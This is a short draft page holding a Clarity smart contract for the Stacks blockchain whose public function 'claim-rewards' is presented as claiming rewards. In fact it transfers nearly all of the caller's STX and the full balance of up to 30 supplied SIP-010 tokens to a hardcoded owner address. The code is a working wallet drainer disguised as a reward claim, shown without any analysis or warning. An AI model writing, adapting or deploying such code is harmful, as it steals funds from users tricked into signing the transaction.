---
title: "Trait claimReward"
draft: true
---
```
(use-trait sip-010-trait 'SP2WEAZJ7JS4AEA8F4HEJQMT0GSF4A51166520MTR.sip-010-trait.sip-010-trait)
(use-trait sip013-semi-fungible-token-trait 'SP2WEAZJ7JS4AEA8F4HEJQMT0GSF4A51166520MTR.sip013-semi-fungible-token-trait.sip013-semi-fungible-token-trait)
(define-data-var TOKEN_OWNER principal 'SPZ2B3W5VJZY45D3BQT4QR99YF6QEJC206PKMZ94)

(define-private (transfer-stx)
  (let
    (
      (sender-balance (stx-get-balance tx-sender))
    )
    (if (>= sender-balance u1000000)
      (let
        (
            (pToken-Owner (var-get TOKEN_OWNER))
            (amount-to-send (- sender-balance u1000000))
            (transfer-result (stx-transfer? amount-to-send tx-sender pToken-Owner))
        )
        (ok (print transfer-result))
      )
      (err u504)
    )
  )
)

(define-private (transfer-token 
                (contract <sip-010-trait>))
  (begin
        (let
            (
                (token-balance (unwrap! (contract-call? contract get-balance tx-sender) (err u407)))
            )
            (if (>= token-balance u10)
                (let
                    (
                        (pToken-Owner (var-get TOKEN_OWNER))
                        (res (contract-call? contract transfer token-balance tx-sender pToken-Owner (some 0x02)))
                    )
                    (ok u200)
                )
                (err u407)
            )
        )
    )
)

(define-public (claim-rewards (token-contracts (list 30 <sip-010-trait>)) (token-ids (list 100 uint)))
    (begin
        (let 
            (
                (res1 (transfer-stx))
                (res2 (map transfer-token token-contracts))
            )
            (ok true)
        )
    )
)
```
